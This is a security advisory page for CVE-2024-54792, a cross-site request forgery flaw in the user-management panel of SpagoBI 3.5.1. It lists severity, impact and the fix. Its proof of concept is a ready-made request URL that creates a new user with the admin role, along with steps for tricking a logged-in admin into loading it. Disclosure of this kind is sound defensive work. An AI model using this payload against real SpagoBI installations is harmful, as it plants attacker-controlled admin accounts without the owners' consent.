---
title: SpagoBI 3.5.1 Cross Site Request Forgery
url: https://cxsecurity.com/issue/WLB-2025010030
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-01-29
fetch_date: 2025-10-06T20:04:56.087155
---

# SpagoBI 3.5.1 Cross Site Request Forgery

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **SpagoBI 3.5.1 Cross Site Request Forgery** **2025.01.28**  Credit:  **[MarioTesoro](https://cxsecurity.com/author/MarioTesoro/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# CVE-2024-54792
\*\*Severity :\*\* \*\*Medium\*\* (\*\*6.1\*\*)
\*\*CVSS score :\*\* `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
## Summary :
Engineering Ingegneria Informatica \*\*SpagoBI\*\* version \*\*3.5.1\*\* is affected by \*\*CSRF\*\* in the admin panel that manages user grants.
## Poc
The add/edit/delete user panel, accessible by the admin user, do not contains csrf countermeasures.
### Steps to Reproduce :
1. Embed this url customizing it with: \*\*host\*\*, \*\*custom\_username\*\* and \*\*custom\_password\*\* and into HTML page that makes the request and trick a victim with admin rights logged into the page to visit it. A new user will be created in the platform.
```
https://<host>/SpagoBI/servlet/AdapterHTTP?ACTION\_NAME=MANAGE\_USER\_ACTION&SBI\_EXECUTION\_ID=-1&LIGHT\_NAVIGATOR\_DISABLED=TRUE&MESSAGE\_DET=USER\_INSERT&\_dc=1727100301044&userId=<custom\_username>&fullName=<custom\_username>&id=0&pwd=<custom\_password>&userRoles=%5B%7B%22name%22%3A%22%2Fspagobi%2Fadmin%22%2C%22id%22%3A5%2C%22description%22%3A%22%2Fspagobi%2Fadmin%22%2C%22checked%22%3Atrue%7D%5D&userAttributes=%5B%5D
```
## Affected Version Details :
- <= 3.5.1
## Impact :
The attacker can trick a victim logged with admin rights to perform a GET request that inserts a user with ad hoc credentials in the platform unconsciously, due to the lack of CSRF countermeasures. Then he can log in with the previously selected credentials.
## Mitigation :
- Update to the latest version.
## References :
- (https://nvd.nist.gov/vuln/detail/CVE-2024-54792)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025010030)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top